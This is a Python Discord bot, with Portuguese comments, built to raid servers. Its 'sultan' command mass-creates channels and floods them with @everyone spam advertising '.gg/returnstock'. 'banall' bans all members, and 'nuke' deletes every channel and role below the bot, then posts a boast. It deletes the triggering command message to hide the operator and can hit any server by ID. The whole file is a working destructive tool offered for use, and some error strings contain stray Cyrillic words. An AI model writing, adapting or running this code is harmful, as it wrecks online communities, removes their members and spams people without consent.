import discord
from discord.ext import commands
import json
import asyncio

# Carregar configuração
with open('config.json', 'r') as f:
    config = json.load(f)

TOKEN = config['token']
PREFIX = config['prefix']
PERMITTED_USERS = config.get('perms', [])
CHANNEL_NAME = config.get("channel_name", "returnstock")
MESSAGE_CONTENT = config.get("message_content", "@here @everyone\n.gg/returnstock")
NUM_CHANNELS = config.get("num_channels", 50)

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True # <-- Adicionar esta linha

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Dicionários para rastrear as mensagens de log por usuário
log_messages = {}
log_content = {}
MAX_LOG_LINES = 25 # Limite de linhas para evitar exceder o limite de caracteres do Discord

async def log_to_user(ctx, message):
    """Envia e atualiza uma mensagem de log para o autor do comando via DM."""
    author_id = ctx.author.id

    if author_id not in log_content:
        log_content[author_id] = []
    log_content[author_id].append(str(message))

    # Mantém o log com um tamanho gerenciável
    if len(log_content[author_id]) > MAX_LOG_LINES:
        log_content[author_id] = log_content[author_id][-MAX_LOG_LINES:]

    formatted_log = "\n".join(log_content[author_id])
    full_message = f"```\n{formatted_log}\n```"

    try:
        log_msg_obj = log_messages.get(author_id)
        # Edita a mensagem se ela existir e o conteúdo for diferente
        if log_msg_obj and log_msg_obj.content != full_message:
            await log_msg_obj.edit(content=full_message)
        # Envia uma nova mensagem se não houver uma rastreada
        elif not log_msg_obj:
            log_msg_obj = await ctx.author.send(full_message)
            log_messages[author_id] = log_msg_obj
    except (discord.errors.Forbidden, discord.errors.NotFound):
        # Se a DM estiver fechada ou a mensagem for deletada, tenta enviar uma nova
        try:
            log_msg_obj = await ctx.author.send(full_message)
            log_messages[author_id] = log_msg_obj
        except discord.errors.Forbidden:
            print(f"(Não foi possível enviar DM para {ctx.author}): {message}")
    except Exception as e:
        print(f"(Erro ao enviar/editar DM para {ctx.author}: {e}): {message}")

async def send_embed_dm(ctx, title, description, color=discord.Color.blue()):
    """Envia uma DM com embed para o autor do comando."""
    embed = discord.Embed(title=title, description=description, color=color)
    embed.set_footer(text="Desenvolvido por @eumendesdev")
    try:
        await ctx.author.send(embed=embed)
    except discord.errors.Forbidden:
        # Fallback para log normal se o usuário desativou DMs ou embeds.
        await log_to_user(ctx, f"AVISO: {title}\n{description}")

async def spam_channel(channel, ctx):
    """Envia mensagens de spam em um canal infinitamente."""
    while True:
        try:
            await channel.send(MESSAGE_CONTENT)
        except Exception as e:
            await log_to_user(ctx, f"Não foi possível enviar mensagem no canal {channel.name}: {e}")
            break

async def create_and_spam(guild, ctx):
    """Cria um canal e começa a spammar."""
    try:
        channel = await guild.create_text_channel(CHANNEL_NAME)
        await log_to_user(ctx, f"Canal '{channel.name}' criado em {guild.name}.")
        # Inicia a tarefa de spam em segundo plano
        asyncio.create_task(spam_channel(channel, ctx))
        return True
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Erro: Sem permissão para criar canais no servidor '{guild.name}'.")
    except Exception as e:
        await log_to_user(ctx, f"Ocorreu um erro ao criar o canal: {e}")
    return False

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')
    print('Pronto para iniciar o raid.')

@bot.command()
async def sultan(ctx, server_id: int = None):
    """Cria múltiplos canais e os inunda com mensagens."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'sultan' por {ctx.author} ({ctx.author.id})")
        return

    # Limpa logs anteriores para iniciar uma nova sessão
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass # Ignora outros erros de exclusão

    guild = bot.get_guild(server_id) if server_id else ctx.guild
    
    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` не foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `v!sultan <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'sultan' recebido de {ctx.author} para o servidor {guild.name}")
    try:
        await send_embed_dm(ctx, "`✅` Raid Iniciado", f"O raid de criação de canais no servidor **{guild.name}** foi iniciado.", color=discord.Color.green())
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Não foi possível enviar DM de confirmação para {ctx.author}. DMs podem estar desativadas.")
    
    tasks = [create_and_spam(guild, ctx) for _ in range(NUM_CHANNELS)]
    results = await asyncio.gather(*tasks)
    
    created_channels_count = sum(1 for r in results if r)

    await send_embed_dm(ctx, "`✅` Criação de Canais Finalizada", f"**{created_channels_count} de {NUM_CHANNELS}** canais foram criados com sucesso no servidor **{guild.name}**.\nO spam de mensagens foi iniciado em cada um deles.", color=discord.Color.green())

@bot.command()
async def banall(ctx, server_id: int = None):
    """Bane todos os membros possíveis do servidor."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'banall' por {ctx.author} ({ctx.author.id})")
        return

    # Limpa logs anteriores para iniciar uma nova sessão
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass

    guild = bot.get_guild(server_id) if server_id else ctx.guild

    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` не foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `v!banall <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'banall' recebido de {ctx.author} para o servidor {guild.name}")
    banned_count = 0
    total_members = len(guild.members)
    
    await send_embed_dm(ctx, "`⚔️` Banimento em Massa Iniciado", f"Iniciando o banimento de **{total_members}** membros no servidor **{guild.name}**.", color=discord.Color.orange())

    for member_to_ban in guild.members:
        if member_to_ban.id in (bot.user.id, guild.owner_id, ctx.author.id):
            continue
        try:
            await member_to_ban.ban(reason="Comando banall executado pelo bot.")
            banned_count += 1
            await log_to_user(ctx, f"Membro {member_to_ban.name}#{member_to_ban.discriminator} banido.")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await log_to_user(ctx, f"Não foi possível banir {member_to_ban.name}#{member_to_ban.discriminator}. Permissões insuficientes ou cargo superior.")
        except Exception as e:
            await log_to_user(ctx, f"Erro desconhecido ao banir {member_to_ban.name}#{member_to_ban.discriminator}: {e}")
            
    try:
        description = (
            f"A operação no servidor **{guild.name}** foi concluída.\n\n"
            f"`📊` **Estatísticas:**\n"
            f"- **{banned_count} de {total_members}** membros banidos."
        )
        await send_embed_dm(ctx, "`✅` Banimento em Massa Finalizado", description, color=discord.Color.green())
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Não foi possível enviar DM de conclusão para {ctx.author}.")

@bot.command()
async def nuke(ctx, server_id: int = None):
    """Deleta todos os canais e cargos abaixo do bot e cria um novo."""
    if str(ctx.author.id) not in PERMITTED_USERS:
        print(f"Uso não autorizado do comando 'nuke' por {ctx.author} ({ctx.author.id})")
        return

    # Limpa logs anteriores para iniciar uma nova sessão
    log_messages.pop(ctx.author.id, None)
    log_content.pop(ctx.author.id, None)

    if ctx.guild:
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await log_to_user(ctx, "Aviso: Não tenho permissão para apagar sua mensagem de comando.")
        except Exception:
            pass

    guild = bot.get_guild(server_id) if server_id else ctx.guild

    if not guild:
        await send_embed_dm(ctx, "`❌` Erro de Comando", f"O servidor com ID `{server_id}` не foi encontrado ou o comando foi usado incorretamente.\n\n**Uso:** `v!nuke <ID_DO_SERVIDOR>`", color=discord.Color.red())
        return

    await log_to_user(ctx, f"Comando 'nuke' recebido de {ctx.author} para o servidor {guild.name}")
    
    try:
        await send_embed_dm(ctx, "`💥` Nuke Iniciado", f"A destruição total do servidor **{guild.name}** foi iniciada. Canais e cargos serão deletados.", color=discord.Color.red())
    except discord.errors.Forbidden:
        await log_to_user(ctx, f"Não foi possível enviar DM de aviso para {ctx.author}.")

    deleted_roles_count = 0
    deleted_channels_count = 0

    bot_member = guild.get_member(bot.user.id)
    if bot_member:
        bot_top_role = bot_member.top_role
        for role in guild.roles:
            if role.position < bot_top_role.position:
                try:
                    if role.name != "@everyone":
                        await role.delete(reason="Comando nuke executado.")
                        await log_to_user(ctx, f"Cargo '{role.name}' deletado.")
                        deleted_roles_count += 1
                        await asyncio.sleep(0.5)
                except discord.Forbidden:
                    await log_to_user(ctx, f"Não foi possível deletar o cargo '{role.name}'. Sem permissão ou cargo gerenciado.")
                except Exception as e:
                    await log_to_user(ctx, f"Erro ao deletar o cargo '{role.name}': {e}")

    for channel in guild.channels:
        try:
            await channel.delete(reason="Comando nuke executado.")
            await log_to_user(ctx, f"Canal '{channel.name}' deletado.")
            deleted_channels_count += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            await log_to_user(ctx, f"Não foi possível deletar o canal '{channel.name}': {e}")
            
    try:
        new_channel = await guild.create_text_channel("servidor-nukado")
        await new_channel.send("@everyone Servidor nukado com sucesso por .gg/returnstock")
        await log_to_user(ctx, "Servidor nukado e novo canal criado.")
        description = (
            f"A destruição do servidor **{guild.name}** foi concluída com sucesso.\n\n"
            f"`📊` **Estatísticas:**\n"
            f"- **{deleted_channels_count}** canais deletados\n"
            f"- **{deleted_roles_count}** cargos deletados"
        )
        await send_embed_dm(ctx, "`✅` Nuke Finalizado", description, color=discord.Color.green())
    except Exception as e:
        await log_to_user(ctx, f"Não foi possível criar o canal após o nuke: {e}")
        try:
            await send_embed_dm(ctx, "`⚠️` Erro no Nuke", f"Não foi possível criar um novo canal no servidor **{guild.name}** após a destruição. Verifique as permissões do bot.", color=discord.Color.orange())
        except discord.errors.Forbidden:
            pass

if TOKEN == "SEU_TOKEN_AQUI":
    print("Por favor, defina o token do seu bot no arquivo config.json")
else:
    bot.run(TOKEN)
